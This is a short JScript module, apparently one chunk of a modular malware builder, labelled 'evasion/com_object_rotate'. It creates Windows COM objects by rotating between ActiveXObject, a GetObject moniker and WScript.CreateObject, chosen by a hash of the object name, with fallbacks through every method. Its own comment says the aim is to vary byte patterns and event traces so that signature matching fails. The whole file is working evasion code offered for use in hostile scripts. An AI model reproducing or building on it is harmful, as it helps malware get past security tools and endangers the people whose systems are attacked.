// chunk: evasion/com_object_rotate
// depends: (none)
// provides: create_com
// format: jscript
// note: Varies COM object creation patterns between ActiveXObject constructor,
//       GetObject moniker, and WScript.CreateObject. Each method produces a
//       different script byte pattern and Windows event trace, defeating
//       signature matching on COM creation calls.

function create_com(progid) {
    var methods = [
        function(p) { return new ActiveXObject(p); },
        function(p) {
            try { return GetObject("new:" + p); } catch(e) { return new ActiveXObject(p); }
        },
        function(p) {
            try { return WScript.CreateObject(p); } catch(e) { return new ActiveXObject(p); }
        }
    ];

    /* Rotate based on progid hash to get deterministic but varied selection */
    var hash = 0;
    for (var i = 0; i < progid.length; i++) {
        hash = ((hash << 5) - hash + progid.charCodeAt(i)) & 0x7FFFFFFF;
    }
    var idx = hash % methods.length;

    try {
        return methods[idx](progid);
    } catch(e) {
        /* Fallback through all methods */
        for (var m = 0; m < methods.length; m++) {
            try { return methods[m](progid); } catch(e2) {}
        }
        return null;
    }
}
